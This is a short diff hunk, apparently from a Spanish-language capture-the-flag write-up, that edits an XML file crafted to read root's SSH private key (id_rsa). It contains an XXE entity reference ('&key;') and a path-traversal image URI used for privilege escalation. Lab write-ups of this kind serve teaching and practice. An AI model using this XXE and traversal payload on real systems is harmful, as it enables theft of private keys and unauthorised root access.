@@ -174,7 +174,7 @@ A continuación creamos un archivo XML que apunte a la id_rsa de root en el dire
 <credits>
   <author>damian</author>
   <image>
-    <uri>/../../../../../../../home/woodenk/gato.jpg</uri>
+    <uri>/../../../../../../../home/woodenk/eskere.jpg</uri>
     <privesc>&key;</privesc>
     <views>0</views>
   </image>
